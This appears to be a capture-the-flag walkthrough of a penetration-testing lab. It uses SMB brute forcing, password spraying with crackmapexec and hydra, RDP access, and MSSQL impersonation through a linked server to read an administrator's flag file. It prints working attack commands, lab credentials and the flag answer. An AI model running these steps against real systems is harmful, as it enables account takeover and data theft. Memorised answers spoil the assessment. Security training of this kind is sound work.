---
title: "Hard"
category: ["PREP_CPTS", "Pen-testing", "Attacking Common Services", "Skill assesemnt", "Hard"]
---

````
## Question 1: What file can you retrieve that belongs to the user "simon"?

### Port Scan

sudo nmap -v -sV -p- 10.129.201.127
````



```
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Three open ports were discovered. **SMB (445/tcp)** and **RDP (3389/tcp)** are highly relevant for user enumeration and subsequent brute-force attacks.

A targeted scan on port **1433** also confirms the presence of an MSSQL database:


```
nmap -Pn -sV -sC -p 1433 10.129.158.12
```


```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|_  DNS_Domain_Name: WIN-HARD
```

### SMB Brute Force

We will utilize Metasploit's `smb_login` module to perform a brute-force attack against the user `simon`:


```
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.129.203.10:445     - Starting SMB login bruteforce
[+] 10.129.203.10:445     - Success: '.\simon:liverpool'
```

Valid credentials identified: `simon:liverpool`

### SMB Enumeration & Share Access

Using `crackmapexec`, we map the shares accessible with Simon's credentials:


```
crackmapexec smb 10.129.203.10 --shares -u 'simon' -p 'liverpool'
```


```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Home            READ            
IPC$            READ            Remote IPC
```

The `Home` share is readable. We connect to it via `smbclient`:


```
smbclient //10.129.203.10/Home -U 'simon%liverpool'
```


```
smb: \> dir
  HR                                  D        0  Thu Apr 21 22:04:39 2022
  IT                                  D        0  Thu Apr 21 22:11:44 2022
  OPS                                 D        0  Thu Apr 21 22:05:10 2022
  Projects                            D        0  Thu Apr 21 22:04:48 2022
```

Navigating into the `IT` directory reveals three user folders: `Fiona`, `John`, and `Simon`. We access Simon's folder to retrieve the target file:


```
smb: \> cd IT\Simon
smb: \IT\Simon\> dir
  random.txt                          A       94  Thu Apr 21 23:16:48 2022

smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt
```

**Answer 1:** `random.txt`

## Question 2: Enumerate the target and look for a password for the user Fiona. What is her password?

### File Inspection (Fiona's Directory)

We navigate to Fiona's directory inside the same `Home` share and download a credential file named `creds.txt`:


```
smb: \> cd IT/Fiona
smb: \IT\Fiona\> dir
  creds.txt                           A      118  Thu Apr 21 22:13:11 2022

smb: \IT\Fiona\> get creds.txt
```


```
cat creds.txt
```


```
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

### SMB Password Spraying

We will use `crackmapexec` to spray this custom password list against Fiona's account:


```
crackmapexec smb 10.129.225.141 -u fiona -p creds.txt --local-auth
```


```
[-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
[+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl 
```

**Answer 2:** `48Ns72!bns74@S84NNNSl`

### Further Share Enumeration (John's Directory)

Using Fiona's valid password, we check her permissions and browse the `IT/John` folder to find more information:


```
smb: \IT\John\> ls
  information.txt                     A      101  Thu Apr 21 23:14:58 2022
  notes.txt                           A      164  Thu Apr 21 23:13:40 2022
  secrets.txt                         A       99  Thu Apr 21 23:15:55 2022
```


```
cat information.txt
```


```
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```


```
cat secrets.txt
```


```
Password Lists:
1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

### RDP Brute Force & Access

We confirm Fiona's credentials work for GUI access via Remote Desktop Protocol (RDP):


```
hydra -l fiona -P creds.txt 10.129.158.12 rdp
```


```
[3389][rdp] host: 10.129.158.12   login: fiona   password: 48Ns72!bns74@S84NNNSl
```

Establish the session:


```
xfreerdp /v:10.129.158.12 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
```

> [!NOTE] Mimikatz execution fails due to insufficient high-level integrity privileges. However, the host allows direct connection to the SQL Server database.

## Question 3: Submit the content of the flag.txt file on the Administrator's desktop.

### Database Connection & Enumeration

From our RDP session, we open PowerShell and connect to the local instance using `sqlcmd`:


```
sqlcmd
```


```
1> select name from master.dbo.sysdatabases
2> go
```

```
name
-------------------------
master
tempdb
model
msdb
TestingDB
TestAppDB
```

### SQL Server Impersonation

Based on the data leaked in John's folder, we will attempt to impersonate `john` within the database context:

```
1> execute as login = 'john'
2> select system_user
3> select is_srvrolemember('sysadmin')
4> go
```

```
-----------
john

-----------
0
```

We are now successfully executing commands as `john`, though we are not a local `sysadmin` yet.
### Linked Server Identification

We check for configured Linked Servers that might allow cross-server execution or horizontal movement:

```
1> select srvname, isremote from sysservers
2> go
```

```
srvname                                               isremote
----------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                   1
LOCAL.TEST.LINKED.SRV                                 0
```

We identified a local linked server: `LOCAL.TEST.LINKED.SRV`

### Linked Server Enumeration & Execution Context

We query the execution context on the linked server using the `AT` clause:

```
1> execute('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [local.test.linked.srv]
2> go
```

```
------------------- ---------------------------------- ---------- -----------
WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 ...      testadmin  1
```

**Crucial Finding:** The linked server executes our commands under the context of `testadmin`, who **is a `sysadmin` (`1`)** on that database instance.

### Flag Extraction (Arbitrary File Read)

Leveraging the `sysadmin` privileges on `LOCAL.TEST.LINKED.SRV`, we issue an `OPENROWSET` bulk query wrapped in an `EXECUTE ... AT` statement to read the Administrator's flag from disk:

```
1> execute('select * from openrowset(bulk ''C:/Users/Administrator/desktop/flag.txt'', single_clob) as contents') at [local.test.linked.srv];
2> go
```

```
BulkColumn
--------------------------------------------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}
```